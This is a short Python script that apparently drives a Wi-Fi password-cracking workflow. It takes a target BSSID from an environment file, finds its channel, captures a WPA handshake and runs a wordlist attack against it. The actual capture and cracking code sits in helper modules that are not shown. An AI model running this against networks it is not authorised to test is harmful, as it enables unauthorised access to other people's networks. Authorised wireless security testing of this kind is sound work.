#!/usr/bin/python3'
import sys
sys.path.append('./src')
from dotenv import load_dotenv
load_dotenv()

import os
from find_channel import findChannel
from capture_handshake import capture
from decrypt_password import decrypt_cap


BSSID = os.environ['BSSID']
channel = findChannel(BSSID)

capture(BSSID, channel)
decrypt_cap('/usr/share/wordlists/nmap.lst')